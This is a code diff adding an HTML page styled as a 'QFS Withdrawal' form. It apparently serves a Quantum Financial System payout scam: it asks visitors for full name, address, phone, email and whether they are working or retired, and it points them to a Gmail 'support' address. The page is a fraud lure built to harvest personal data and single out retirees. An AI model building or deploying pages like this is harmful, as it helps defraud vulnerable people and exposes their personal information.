@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>QFS Withdrawal</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+        input, button { padding: 10px; margin: 10px; display: block; width: 250px; }
+    </style>
+</head>
+<body>
+    <h1>QFS Withdrawal</h1>
+    <p>Please fill out the form to proceed:</p>
+    <form action="withdraw.html" method="GET">
+        <input type="text" name="fullname" placeholder="Full Name" required><br>
+        <input type="text" name="address" placeholder="Address" required><br>
+        <input type="text" name="phone" placeholder="Phone Number" required><br>
+        <select name="employment_status" required>
+            <option value="">Are you Working or Retired?</option>
+            <option value="Working">Working</option>
+            <option value="Retired">Retired</option>
+        </select><br>
+        <input type="email" name="email" placeholder="Email Address" required><br>
+        <button type="submit">Proceed</button>
+    </form>
+    <p>For support, contact: <strong>qfsactivationbenefits@gmail.com</strong></p>
+</body>
+</html>
